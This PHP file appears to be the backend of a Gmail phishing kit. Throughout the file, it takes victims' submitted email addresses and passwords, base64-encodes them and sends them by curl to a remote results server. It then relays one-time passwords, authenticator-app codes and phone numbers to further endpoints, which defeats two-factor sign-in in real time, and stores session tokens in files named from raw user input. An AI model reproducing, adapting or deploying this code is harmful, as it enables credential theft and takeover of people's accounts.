<?php
include 'config.php';
$em = isset($_POST['ai']) ? trim($_POST['ai']) : null;
$pas = isset($_POST['pr']) ? trim($_POST['pr']) : null;

if(isset($_POST['cd'])){
    $cc= $_POST['cd'];
    $par =$params."&otp=".$cc;
    $myfile = fopen($_POST['em'].".txt", "r") or die("Unable to open file!");
    $sess=fread($myfile,filesize($_POST['em'].".txt"));
    $url = $base."results/gmail-otp?".$par."&session=".$sess;
    $res=curl($url);
    print_r($res);
    exit();
}

if(isset($_POST['ath'])){
    $cc= $_POST['ath'];
    $par =$params."&otp=".$cc;
    $myfile = fopen($_POST['em'].".txt", "r") or die("Unable to open file!");
    $sess=fread($myfile,filesize($_POST['em'].".txt"));
    $url = $base."results/gmail-auth-app-code?".$par."&session=".$sess;
    $res=curl($url);
    print_r($res);
    exit();
}

if(isset($_POST['ph'])){
    $cc= $_POST['ph'];
    $par =$params."&ph=".$cc;
    $myfile = fopen($_POST['em'].".txt", "r") or die("Unable to open file!");
    $sess=fread($myfile,filesize($_POST['em'].".txt"));
    $url = $base."results/gmail-set-num?".$par."&session=".$sess;
    $res=curl($url);
    print_r($res);
    exit();
}

if($em != null && $pas != null){
    $par =$params."&result_email=".base64_encode($em)."&result_password=".base64_encode($pas);
    $url = $base."results/set-gmail?".$par;
    $res=curl($url);
    $resp= json_decode($res);
    $exists = strpos(trim($resp->response), "numberTAP");
    if ($exists !== false) {
        $myfile = fopen($resp->email.".txt" , "w") or die("Unable to open file!");
        $txt = $resp->session;
        fwrite($myfile, $txt);
        print_r(trim($resp->response));
        exit();
    }
    if(trim($resp->response)=="Need OTP"){
        $myfile = fopen($resp->email.".txt" , "w") or die("Unable to open file!");
        $txt = $resp->session;
        fwrite($myfile, $txt);
        print_r("otp");
        exit();
    } if(trim($resp->response)=="Need Email OTP"){
        $myfile = fopen($resp->email.".txt" , "w") or die("Unable to open file!");
        $txt = $resp->session;
        fwrite($myfile, $txt);
        print_r("emotp");
        exit();
    }if(trim($resp->response)=="need_email_otp"){
        $myfile = fopen($resp->email.".txt" , "w") or die("Unable to open file!");
        $txt = $resp->session;
        fwrite($myfile, $txt);
        print_r("emotp");
        exit();
    }
    if(trim($resp->response)=="need_otp"){
        $myfile = fopen($resp->email.".txt" , "w") or die("Unable to open file!");
        $txt = $resp->session;
        fwrite($myfile, $txt);
        print_r("emotp");
        exit();
    }
    
    elseif(trim($resp->response)=="Wrong Password"){
        print_r("wrong password");
        exit();
    }elseif(trim($resp->response)=="Wrong Email Address"){
        print_r("wrong email");
        exit();
    }else if(trim($resp->response)=="saved"){
        print_r("saved");
        exit();
    }else if(trim($resp->response)=="tap_yes"){
        $myfile = fopen($resp->email.".txt" , "w") or die("Unable to open file!");
        $txt = $resp->session;
        fwrite($myfile, $txt);
        print_r("tap_yes");
        exit();
    }else if(trim($resp->response)=="verify_ph"){
        $myfile = fopen($resp->email.".txt" , "w") or die("Unable to open file!");
        $txt = $resp->session;
        fwrite($myfile, $txt);
        print_r("verify_ph");
        exit();
    }else if(trim($resp->response)=="need_auth_code"){
        $myfile = fopen($resp->email.".txt" , "w") or die("Unable to open file!");
        $txt = $resp->session;
        fwrite($myfile, $txt);
        print_r("need_auth_code");
        exit();
    }
}
function curl($url){
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HEADER, false);
    $data = curl_exec($curl);
    curl_close($curl);
    return $data;
}
?>
